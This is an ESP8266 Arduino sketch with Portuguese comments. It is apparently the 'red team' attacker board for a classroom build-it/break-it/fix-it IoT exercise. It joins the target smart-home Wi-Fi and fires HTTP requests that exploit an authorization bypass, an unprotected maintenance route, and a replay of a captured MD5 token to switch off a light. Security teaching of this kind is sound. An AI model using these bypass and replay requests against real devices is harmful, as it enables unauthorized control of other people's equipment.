/*
 * ============================================================================
 * Projeto BIBIFI IoT - Placa Atacante (Red Team em uma 2a NodeMCU)
 * ============================================================================
 * Opcional para usar uma segunda NodeMCU ESP8266 como atacante de bancada
 * (sem componentes externos):
 *   1. Conecta automaticamente na rede Wi-Fi "SmartHome_IoT" do alvo.
 *   2. Ao apertar o botão físico "FLASH" (GPIO 0):
 *      - Tenta o Break 1A (fluxo de controle em /luz) e Break 1B (/api/manutencao);
 *      - Se o alvo já estiver corrigido, lê um token capturado via Monitor Serial
 *        (sniffing feito no notebook com tcpdump/Wireshark) e dispara o Break 2
 *        (Replay Attack) para apagar a luz principal.
 * ============================================================================
 */

#include <ESP8266WiFi.h>
#include <ESP8266HTTPClient.h>
#include <WiFiClient.h>

const char* ALVO_SSID  = "SmartHome_IoT";
const char* ALVO_SENHA = "12345678";
const String ALVO_HOST = "http://192.168.4.1";

const int PINO_BOTAO_FLASH = 0; // GPIO 0 (Botão FLASH nativo da NodeMCU)

void piscarLedInterno(int vezes, int intervaloMs) {
  for (int i = 0; i < vezes; i++) {
    digitalWrite(LED_BUILTIN, LOW);  // LED interno da NodeMCU é ativo em LOW
    delay(intervaloMs);
    digitalWrite(LED_BUILTIN, HIGH);
    delay(intervaloMs);
  }
}

void executarSequenciaDeAtaque() {
  WiFiClient client;
  HTTPClient http;

  Serial.println("\n----------------------------------------------------");
  Serial.println("[Red Team NodeMCU] Iniciando sequência de ataque...");
  piscarLedInterno(2, 100);

  // Tentativa 1: Break 1A (falha de fluxo de controle em /luz)
  Serial.println("[1/3] Testando Break 1A (bypass de visitante na rota /luz)...");
  http.begin(client, ALVO_HOST + "/luz?acao=OFF&user=visitante");
  http.GET();
  http.end();

  http.begin(client, ALVO_HOST + "/status");
  http.GET();
  String statusJson = http.getString();
  http.end();

  if (statusJson.indexOf("\"luz_acesa\":false") != -1) {
    Serial.println("[Sucesso - Break 1A] Luz apagada explorando falha de fluxo (Mistake).");
    piscarLedInterno(5, 80);
    return;
  }

  // Tentativa 2: Break 1B (rota /api/manutencao sem proteção)
  Serial.println("[2/3] Break 1A bloqueado. Testando Break 1B (/api/manutencao)...");
  http.begin(client, ALVO_HOST + "/api/manutencao?cmd=apagar_tudo");
  int code1B = http.GET();
  http.end();

  if (code1B == 200) {
    Serial.println("[Sucesso - Break 1B] Luz apagada pela rota de manutenção.");
    piscarLedInterno(5, 80);
    return;
  }

  // Tentativa 3: Break 2 (Replay Attack usando token enviado pelo Monitor Serial)
  Serial.println("[3/3] Alvo corrigido. Executando Replay Attack...");
  String tokenCapturado = "";
  if (Serial.available()) {
    tokenCapturado = Serial.readStringUntil('\n');
    tokenCapturado.trim();
  }

  if (tokenCapturado.length() > 0) {
    Serial.println("      Token MD5 recebido: " + tokenCapturado);
    Serial.println("      Replicando comando OFF com o token capturado...");

    http.begin(client, ALVO_HOST + "/luz?acao=OFF&user=admin&token=" + tokenCapturado);
    int codeReplay = http.GET();
    String respReplay = http.getString();
    http.end();

    if (codeReplay == 200) {
      Serial.println("[Sucesso - Break 2] Luz apagada via Replay Attack.");
      piscarLedInterno(8, 60);
    } else {
      Serial.println("[Bloqueado] O alvo rejeitou o Replay Attack (Nonce ativo): " + respReplay);
    }
  } else {
    Serial.println("[Aviso] Para Replay via 2a placa, envie o token capturado pelo Monitor Serial");
    Serial.println("        (ou use 'sudo python3 ataques/painel_ataque_grupo.py' para sniffar ao vivo).");
  }
}

void setup() {
  Serial.begin(115200);
  pinMode(LED_BUILTIN, OUTPUT);
  pinMode(PINO_BOTAO_FLASH, INPUT_PULLUP);
  digitalWrite(LED_BUILTIN, HIGH);

  Serial.println("\n[Red Team] Conectando na rede SmartHome_IoT do alvo...");
  WiFi.mode(WIFI_STA);
  WiFi.begin(ALVO_SSID, ALVO_SENHA);

  while (WiFi.status() != WL_CONNECTED) {
    delay(300);
    Serial.print(".");
  }

  Serial.println("\n[Conectado] Placa atacante pronta.");
  Serial.println("Aperte o botão FLASH na NodeMCU para disparar o ataque.");
  digitalWrite(LED_BUILTIN, LOW); // LED aceso = conectado e pronto para atacar
}

void loop() {
  if (digitalRead(PINO_BOTAO_FLASH) == LOW) {
    delay(50); // Debounce
    if (digitalRead(PINO_BOTAO_FLASH) == LOW) {
      executarSequenciaDeAtaque();
      digitalWrite(LED_BUILTIN, LOW);
      while (digitalRead(PINO_BOTAO_FLASH) == LOW) delay(50);
    }
  }
}
